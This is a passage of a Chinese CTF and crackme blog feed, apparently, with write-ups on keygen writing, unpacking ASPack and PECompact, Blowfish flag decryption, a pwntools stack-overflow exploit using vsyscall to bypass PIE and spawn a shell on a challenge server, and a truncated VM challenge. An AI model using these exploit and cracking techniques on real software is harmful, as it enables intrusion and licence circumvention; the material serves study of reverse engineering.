alt="image-20200806190419665"></p><p>对话框弹出的内容仍然不是UNLOCKED！ida中OD都可以找到MessageBoxA看一下。这里使用OD：<img src="/2020/07/31/CrackMe/image-20200806190848568.png" alt="image-20200806190848568"></p><p>从上面看到，[402308]的值会决定对不对[402313]的值修改，所以对[402308]的值修改：成功。最后要让程序之后也可以这样运行，简单的patch一下即可。</p><p>下面开始找注册算法，疑惑的是Register按钮为什么不能点击？难道还要对程序打补丁什么的，不熟悉Win32编程脑子还是一片空白。</p><p>但是机缘巧合下，让我找到了这里面的玄机。在OD中找到获取我们输入字符串的函数后，条件反射下了断。随便点击了下程序的输入文本框，程序突然在OD中断了下来。。且看到下面的一个<strong>EnableWindow</strong>函数，百度下功能：设置窗口的可用性，即我们程序的Resiter按钮是否可用。<img src="/2020/07/31/CrackMe/image-20200806193140672.png" alt="image-20200806193140672"></p><p>多次测试，发现第一个GetDlgItemTextA是获取name字符串，第二个获取key。且每输入一个name字符就调用一次第一个GetDlgItemTextA函数将该字符存入指定的内存区域，返回字符长度；每输入一个key就调用第二个GetDlgItemTextA函数将其存入指定内存区域，返回字符长度，并调用<strong>004012F3</strong>函数（应该是name与key的验证过程），最后通过<strong>004012F3</strong>函数的返回值来执行<strong>EnableWindow</strong>函数，以此决定<strong>Register</strong>按钮的按钮是否可用。</p><p>输入数据，下断004012F3并进入：<img src="/2020/07/31/CrackMe/image-20200806233948875.png" alt="image-20200806233948875"></p><p>到此，结束对程序的分析。最后将每个十六进制数转化为对应的字符的汇编指令还要多看看：<code>sbb al, 69；das；</code>。这里al = 0xE，sbb带借位减法后：al = al-0x69-CF = 0xAE。</p><blockquote><p>das：组合(压缩)BCD码的加法调整指令。<strong>功能：如果AL低四位&gt;9或AF=1 ，则AL的值减06h，并置AF=1；如果AL高四位&gt;9或CF=1 ，则AL的值减60h ,且置CF=1；</strong></p></blockquote><p>所以这里：al = al-0x60 = 0x45。<strong>而0x45就是’E’字符的ASCII。</strong></p><p>最后C语言简单写个注册机程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ans = <span class="number">0x44414D4E</span>, i = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"name："</span>);</span><br><span class="line">gets(name);</span><br><span class="line"><span class="keyword">while</span>(name[i])</span><br><span class="line">&#123;</span><br><span class="line">temp += name[i];</span><br><span class="line">ans = ((ans &gt;&gt; <span class="number">1</span>) | ((ans&amp;<span class="number">1</span>) &lt;&lt; <span class="number">31</span>));</span><br><span class="line">ans = ((ans &gt;&gt; i) | ((ans&amp;((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>, i)<span class="number">-1</span>))) &lt;&lt; <span class="number">32</span>-i));</span><br><span class="line">ans ^= temp;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">ans |= <span class="number">0x10101010</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X"</span>, ans);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="跃跃欲试"><a href="#跃跃欲试" class="headerlink" title="跃跃欲试"></a>跃跃欲试</h2><p>——题目来自看雪题库</p><p>题目加了Aspack壳，直接OD中堆栈平衡原理脱壳。</p><p>找到获取用户输入信息的API，来到验证过程：首先是下断点的4个函数对email_address验证。<img src="/2020/07/31/CrackMe/image-20200810111355447.png" alt="image-20200810111355447"></p><p>动态很多次，始终没调出这几个函数的功能且代码逻辑也奇怪。。。</p><p>题目的要求只要后面serial，或许serial与email_address与serial没有关系，干脆直接跳过email_addree设置新的EIP，来到验证serial处：<img src="/2020/07/31/CrackMe/image-20200810111950081.png" alt="image-20200810111950081"></p><p>果然，serial与email_address没有关系，serial的验证也只是简单的加减法。就是整理起来有点麻烦。</p><p>最后载入IDA看看伪代码呢。原来是C标准库里查找子字符串的函数。<img src="/2020/07/31/CrackMe/image-20200810112350707.png" alt="image-20200810112350707"></p><h2 id="一知半解"><a href="#一知半解" class="headerlink" title="一知半解"></a>一知半解</h2><p>——题目来自看雪题库</p><p>从这个CM认识了一个新壳：PEcompact</p><p>载入OD仍然使用堆栈平衡原理脱壳，但对这个壳好像不适用。。。认为自己找到了OEP，dump后发现打不开。</p><p>来到看雪论坛找师傅们脱这个壳的方法，先是使用了<a href="https://bbs.pediy.com/user-24467.htm" target="_blank" rel="noopener">CCDebuger</a>大师傅的脱壳脚本，真的是强，算是脱壳机了。脱壳后发现和我找到的OEP是一样，那我的应该是没有修复输入表导致打不开。</p><p>后面又看到了一位师傅脱这个壳的帖子，里面这样说道：</p><blockquote><p><strong>外壳完整地保留了输入表，外壳加载时没有对IAT加密；外壳解压数据时，完整的输入表会在内存中出现，然后外壳用显示加载DLL的方式获得各个函数的地址，并将该地址填充到IAT中。</strong></p></blockquote><p>所以我回到OD换了第二个dump的方式：<img src="/2020/07/31/CrackMe/image-20200811111903851.png" alt="image-20200811111903851"></p><p>哈哈，还没有用importRec就能成功打开，只不过这个也看情况。</p><p>另外记录一下用esp定律脱这个壳不一样的地方：首先下硬件访问断点。<img src="/2020/07/31/CrackMe/image-20200811112234416.png" alt="image-20200811112234416"></p><p>F9后，断在程序的领空：可以看到并不是从堆栈pop出下断的数据断下的，所以继续F9。<img src="/2020/07/31/CrackMe/image-20200811112818716.png" alt="image-20200811112818716"></p><p>后面遇到同上处理，直到看到对堆栈访问。不久看到来到OEP标志。<img src="/2020/07/31/CrackMe/image-20200811113028787.png" alt="image-20200811113028787"></p><p>最后，程序的逆向很简单。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本帖主要对练习Crackme的知识点与突破点进行记录。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CrackMe" scheme="https://www.Bxnop.cn/categories/CrackMe/"/>
    
    
      <category term="破解" scheme="https://www.Bxnop.cn/tags/%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>杂合writeup</title>
    <link href="https://www.bxnop.cn/2020/07/29/%E6%9D%82%E5%90%88writeup/"/>
    <id>https://www.bxnop.cn/2020/07/29/%E6%9D%82%E5%90%88writeup/</id>
    <published>2020-07-29T08:25:14.000Z</published>
    <updated>2020-10-17T13:10:51.677Z</updated>
    
    <content type="html"><![CDATA[<p>平时一些零散的CTF题的记录。<a id="more"></a></p><h2 id="little-fish-re"><a href="#little-fish-re" class="headerlink" title="little fish (re)"></a>little fish (re)</h2><blockquote><p>链接：<a href="https://pan.baidu.com/s/1Wpl5KjFQf33hgQpE29YuKQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1Wpl5KjFQf33hgQpE29YuKQ</a><br>提取码：slh8<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p></blockquote><p>程序打不开，提示缺少libstdc++-6.dll，做完google半天找这个库下载，但都是32位的。。想验证flag都不行。。</p><p>ida中main函数伪代码，很简单：<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817163536555.png" alt="image-20200817163536555"></p><p>加密函数整体：里面还涉及2个表，且加密有点绕。感觉是什么加密。。但不清楚。。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817164301185.png" alt="image-20200817164301185"></p><p>之后从百度了其中的一个表中部分数据，从一篇文章中找到加密算法：</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817164720071.png" alt="image-20200817164720071"></p><p>其实题目文件有提示，但对于不知道这个加密算法来说就是没有提示。。。</p><p>然后找blowfish加密算法文章学习。<a href="https://www.cnblogs.com/my_life/articles/5845940.html" target="_blank" rel="noopener">讲的好清楚</a></p><p>再次回到ida中看题目中的加密算法，对比下，这次当然是清楚好多，也确定了就是正常的blowfish加密。</p><p>先是写找到网上的blowfish加密算法，使用C语言写来模拟了下，然后解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> P[<span class="number">16</span> + <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> S[<span class="number">4</span>][<span class="number">256</span>];</span><br><span class="line">&#125; BLOWFISH_CTX;</span><br><span class="line"></span><br><span class="line">BLOWFISH_CTX ctx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ORIG_P[] = &#123; 原始的P盒数据 &#125;;<span class="comment">//使用PI来填充的</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ORIG_S[] = &#123; 原始的S盒数据，太多这里省略 &#125;;<span class="comment">//使用PI来填充的</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">F</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> a, b, c, d;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  y;</span><br><span class="line"></span><br><span class="line">    d = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    c = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    b = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    a = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    y = ctx-&gt;S[<span class="number">0</span>][a] + ctx-&gt;S[<span class="number">1</span>][b];</span><br><span class="line">    y = y ^ ctx-&gt;S[<span class="number">2</span>][c];</span><br><span class="line">    y = y + ctx-&gt;S[<span class="number">3</span>][d];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Blowfish_Encrypt</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xl, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xl;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  temp;</span><br><span class="line">    <span class="keyword">short</span> i;</span><br><span class="line"></span><br><span class="line">    Xl = *xl;</span><br><span class="line">    Xr = *xr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">        Xl = Xl ^ ctx-&gt;P[i];</span><br><span class="line">        Xr = F(ctx, Xl) ^ Xr;</span><br><span class="line"></span><br><span class="line">        temp = Xl;</span><br><span class="line">        Xl = Xr;</span><br><span class="line">        Xr = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    temp = Xl;</span><br><span class="line">    Xl = Xr;</span><br><span class="line">    Xr = temp;</span><br><span class="line"></span><br><span class="line">    Xr = Xr ^ ctx-&gt;P[N];</span><br><span class="line">    Xl = Xl ^ ctx-&gt;P[N + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    *xl = Xl;</span><br><span class="line">    *xr = Xr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Blowfish_Decrypt</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xl, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xl;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  temp;</span><br><span class="line">    <span class="keyword">short</span>       i;</span><br><span class="line"></span><br><span class="line">    Xl = *xl;</span><br><span class="line">    Xr = *xr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = N + <span class="number">1</span>; i &gt; <span class="number">1</span>; --i) &#123;</span><br><span class="line">        Xl = Xl ^ ctx-&gt;P[i];</span><br><span class="line">        Xr = F(ctx, Xl) ^ Xr;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exchange Xl and Xr */</span></span><br><span class="line">        temp = Xl;</span><br><span class="line">        Xl = Xr;</span><br><span class="line">        Xr = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exchange Xl and Xr */</span></span><br><span class="line">    temp = Xl;</span><br><span class="line">    Xl = Xr;</span><br><span class="line">    Xr = temp;</span><br><span class="line"></span><br><span class="line">    Xr = Xr ^ ctx-&gt;P[<span class="number">1</span>];</span><br><span class="line">    Xl = Xl ^ ctx-&gt;P[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    *xl = Xl;</span><br><span class="line">    *xr = Xr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Blowfish_Init</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">char</span>* key, <span class="keyword">int</span> keyLen)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> data, datal, datar;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++)</span><br><span class="line">            ctx-&gt;S[i][j] = ORIG_S[<span class="number">256</span>*i+j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N + <span class="number">2</span>; ++i) &#123;</span><br><span class="line">        data = <span class="number">0x00000000</span>;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k) &#123;</span><br><span class="line">            data = (data &lt;&lt; <span class="number">8</span>) | key[j];</span><br><span class="line">            j = j + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= keyLen)</span><br><span class="line">                j = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ctx-&gt;P[i] = ORIG_P[i] ^ data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    datal = <span class="number">0x00000000</span>;</span><br><span class="line">    datar = <span class="number">0x00000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N + <span class="number">2</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        Blowfish_Encrypt(ctx, &amp;datal, &amp;datar);</span><br><span class="line">        ctx-&gt;P[i] = datal;</span><br><span class="line">        ctx-&gt;P[i + <span class="number">1</span>] = datar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j += <span class="number">2</span>) &#123;</span><br><span class="line">            Blowfish_Encrypt(ctx, &amp;datal, &amp;datar);</span><br><span class="line">            ctx-&gt;S[i][j] = datal;</span><br><span class="line">            ctx-&gt;S[i][j + <span class="number">1</span>] = datar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">16</span>, <span class="number">181</span>,  <span class="number">42</span>, <span class="number">236</span>, <span class="number">176</span>,  <span class="number">80</span>, <span class="number">177</span>,  <span class="number">35</span>,  <span class="number">64</span>,  <span class="number">58</span>,</span><br><span class="line">        <span class="number">39</span>, <span class="number">124</span>,  <span class="number">30</span>,  <span class="number">83</span>,  <span class="number">41</span>,  <span class="number">31</span>, <span class="number">177</span>,  <span class="number">21</span>,  <span class="number">54</span>,  <span class="number">40</span>,</span><br><span class="line">        <span class="number">251</span>,  <span class="number">17</span>, <span class="number">191</span>, <span class="number">225</span>,  <span class="number">50</span>,  <span class="number">30</span>, <span class="number">197</span>,  <span class="number">18</span>, <span class="number">228</span>,  <span class="number">96</span>,</span><br><span class="line">        <span class="number">172</span>,  <span class="number">64</span></span><br><span class="line">    &#125;;<span class="comment">//题目中的加密数据</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> key[] = <span class="string">"R3v3rs3!"</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">33</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    Blowfish_Init(&amp;ctx, key, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> *l = ((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ida_chars + <span class="number">4</span> * i));</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> *r = ((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ida_chars + <span class="number">4</span> * (i+<span class="number">1</span>)));</span><br><span class="line">        </span><br><span class="line">        *l = _byteswap_ulong(*l), *r = _byteswap_ulong(*r);</span><br><span class="line">        Blowfish_Decrypt(&amp;ctx, l, r);</span><br><span class="line">        *l = _byteswap_ulong(*l), *r = _byteswap_ulong(*r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag&#123;"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, ida_chars[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817165817614.png" alt="image-20200817165817614"></p><p>python一向搞这些都是很方便的，找到了可以使用Crypto模块。</p><p><a href="https://www.cnblogs.com/ws17345067708/p/10552836.html" target="_blank" rel="noopener">安装</a></p><p>goole和百度了用法 <a href="https://blog.csdn.net/yyhustim/article/details/8539065?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param" target="_blank" rel="noopener">用法</a>：得到和C语言中一样的结果。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817170245529.png" alt="image-20200817170245529"></p><p>最后，关键就是算法的学习。</p><h2 id="magic-number-pwn"><a href="#magic-number-pwn" class="headerlink" title="magic_number (pwn)"></a>magic_number (pwn)</h2><blockquote><p>第一次遇到，利用vsyscall中的ret指令充当滑梯，直到可以通过覆盖低字节处得到我们指定函数的地址。</p></blockquote><p>查保护：关键就是程序开启了PIE。</p><blockquote><p>PIE全称是position-independent  executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址。</p></blockquote><p>本题，栈溢出，控制程序走向即可。但难的就是有PIE使程序每次加载的地址不一样。</p><p>利用vsyscall绕过PIE。<strong>可以利用的地址是0xffffffffff600000、0xffffffffff600400、 0xffffffffff600800</strong>，因为他们是不变的。</p><p>首先查看利用proc文件查看程序加载的基地址：<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911210254714.png" alt="image-20200911210254714"></p><p>更改ida载入的基地址使其与之对应。找到要下断的地址。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911210500410.png" alt="image-20200911210500410"></p><p>gdb下断调试，通过查看栈确定需要使用vsyscall的个数。可以看到使用4个即可。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911210854601.png" alt="image-20200911210854601"></p><p>找到需要控制程序走向的目的地址。（即system(‘bin/sh’);）<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911211045084.png" alt="image-20200911211045084"></p><p>所以最后只需将最低字节的<strong>80</strong>覆盖为<strong>A8</strong>即可。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>, <span class="number">10053</span>)</span><br><span class="line"><span class="comment">#p = process('./8')</span></span><br><span class="line">pay = <span class="string">'B'</span>*<span class="number">0x38</span>+p64(<span class="number">0xFFFFFFFFFF600400</span>)+p64(<span class="number">0xFFFFFFFFFF600400</span>)+p64(<span class="number">0xFFFFFFFFFF600400</span>)+p64(<span class="number">0xFFFFFFFFFF600400</span>)+<span class="string">b'\xA8'</span></span><br><span class="line">p.recvuntil(<span class="string">'Your Input :'</span>)</span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="VM-WORLD（re）"><a href="#VM-WORLD（re）" class="headerlink" title="VM_WORLD（re）"></a>VM_WORLD（re）</h2><blockquote><p>链接：<a href="https://pan.baidu.com/s/1BYmMrqGaiKT6W_HVd9eoPA" target="_blank" rel="noopener">https://pan.baidu.com/s/1BYmMrqGaiKT6W_HVd9eoPA</a><br>提取码：5b5o<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p></blockquote><p>一个简单的虚拟机题目，从学校师傅哪里学会了修复ida无法F5switch语句的方法。</p><p>首先简单看一下:<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912171012942.png" alt="image-20200912171012942"></p><p>所以进入OD动态到关键函数，并dump出，载入ida：可以看到是不能F5的。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912171258533.png" alt="image-20200912171258533"></p><p>但看了一下这个函数的代码也不是很长，直接读汇编将其写成了C语言代码：一个简单的虚拟机。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 